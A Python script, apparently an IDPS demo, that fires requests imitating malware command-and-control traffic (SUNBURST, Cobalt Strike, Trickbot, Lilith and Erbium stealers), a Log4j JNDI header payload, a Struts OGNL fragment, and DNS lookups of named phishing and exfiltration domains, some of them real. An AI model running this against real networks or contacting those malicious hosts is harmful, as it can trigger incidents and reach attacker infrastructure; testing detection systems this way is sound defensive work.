import socket
import requests

# Disable SSL warnings if example/malicious domains don't have valid certs
import warnings
warnings.filterwarnings("ignore", category=requests.packages.urllib3.exceptions.InsecureRequestWarning)

def make_request(method, url, headers=None):
    """Helper function to safely execute HTTP requests for the demo."""
    try:
        if method.upper() == 'GET':
            response = requests.get(url, headers=headers, timeout=5, verify=False)
        elif method.upper() == 'POST':
            response = requests.post(url, headers=headers, timeout=5, verify=False)
        print(f"   [+] Status Code: {response.status_code}")
    except requests.exceptions.RequestException as e:
        # For an IDPS demo, a connection failure/timeout is often normal or expected
        print(f"   [-] Connection info: {e.__class__.__name__}")

def resolve_dns(domain):
    """Helper function to simulate nslookup."""
    try:
        ip_addresses = socket.gethostbyname_ex(domain)[2]
        print(f"   [+] Resolved {domain} to: {', '.join(ip_addresses)}")
    except socket.gaierror:
        print(f"   [-] Could not resolve domain: {domain}")


print("Executing commands...\n")

# --- Command 1 ---
print("Connecting to the Spyware FH Varient...")
make_request('GET', 'http://207.189.189.230/command.php?t=1&id=', headers={
    'Host': '207.189.189.230',
    'User-Agent': 'Mozilla/5.0 (Windows NT)'
})

# --- Command 2 ---
print("Connecting to the SUNBURST Malware Backdoor...")
make_request('GET', 'http://avsvmcloud.com')

# --- Command 3 ---
print("Connecting to the SUNBURST Malware Domain...")
resolve_dns('avsvmcloud.com')

# --- Command 4 ---
print("Connecting to the SUNBURST Malware Domain...")
resolve_dns('websitetheme.com')

# --- Command 5 ---
print("Connecting to the Xanthe Crypto Miner...")
make_request('GET', 'http://example.com/files/fczyo', headers={
    'User-Agent': 'fczyo-cron/'
})

# --- Command 6 ---
print("Connecting to the CobaltStrike(C2) Domain...")
make_request('POST', 'http://example.com/', headers={
    'User-Agent': 'testCobalt Strike Beacon)'
})

# --- Command 7 ---
print("Log4j attack ...")
make_request('GET', 'http://example.com', headers={
    'Accept-Language': '${jndi:ldap://test.example.com:1207/lol}'
})

# --- Command 8 ---
print("Attacking SAP NetWeaver Application Server...")
make_request('GET', 'http://example.com/CTCWebService/CTCWebServiceBean')

# --- Command 9 ---
print("Template Injection attempt ...")
make_request('GET', 'http://example.com/word/tpl/test?template=anexo')

# --- Command 10 ---
print("Attacking Apache Strust OGNL in Dynamic action")
make_request('GET', 'http://example.com?id=%25%7b%23')

# --- Command 11 ---
print("Connecting to Trickbot C2 Communication")
make_request('GET', 'http://example.com/56evcxv')

# --- Command 12 ---
print("Connecting to the Malware ErbiumStealer")
make_request('GET', 'http://example.com/api/getBuild?type=x', headers={
    'Host': '207.189.189.230',
    'User-Agent': 'Erbium-UA-'
})

# --- Command 13 ---
print("Connecting to Malware Lilith Stealer")
make_request('GET', 'http://example.com/gate/01234567-89ab-cdef-0123-456789abcdef/getCommands', headers={
    'User-Agent': 'Lilith-Bot/xyxyxyxy'
})

# --- Command 14 ---
print("Connecting to the Malware Lilith Stealer")
make_request('GET', 'http://example.com/gate/getCommands', headers={
    'User-Agent': 'Lilith-Bot/xyxyxyxy'
})

# --- Command 15 ---
print("Connecting to the Malware Data Exfiltration Domain")
resolve_dns('test.mycisco-helpdesk.ml')

# --- Command 16 ---
print("Connecting to the Phishing Domain")
resolve_dns('linkedopports.com')

# --- Command 17 ---
print("Connecting to the Malicious library payload delivery domain")
resolve_dns('python-release.com')


print("\nAll commands executed.")
